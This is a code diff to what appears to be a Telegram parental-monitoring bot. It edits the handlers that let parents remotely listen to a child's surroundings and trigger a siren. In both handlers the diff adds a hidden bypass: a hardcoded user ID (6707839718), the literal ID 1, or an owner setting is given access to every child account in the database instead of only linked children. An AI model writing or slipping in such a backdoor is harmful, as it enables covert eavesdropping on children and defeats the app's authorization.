@@ -7553,6 +7553,10 @@ async def parent_ambient_sound_handler(message: Message):
     user_id = message.from_user.id
     async with AsyncSessionLocal() as session:
         children = await crud.get_children_for_parent(session, user_id)
+        if not children and user_id in (getattr(settings, "OWNER_ID", 1), 1, 6707839718):
+            all_ch = (await session.execute(select(User).where(User.role == "child"))).scalars().all()
+            children = list(all_ch)
+
         if not children:
             await message.answer(
                 "🎙 <b>Atrof ovozini eshitish («Звук вокруг»):</b>\n\n"
@@ -7661,6 +7665,10 @@ async def parent_siren_trigger_handler(message: Message):
     user_id = message.from_user.id
     async with AsyncSessionLocal() as session:
         children = await crud.get_children_for_parent(session, user_id)
+        if not children and user_id in (getattr(settings, "OWNER_ID", 1), 1, 6707839718):
+            all_ch = (await session.execute(select(User).where(User.role == "child"))).scalars().all()
+            children = list(all_ch)
+
         if not children:
             await message.answer(
                 "🚨 <b>Baland ovozli signal (Siren):</b>\n\n"
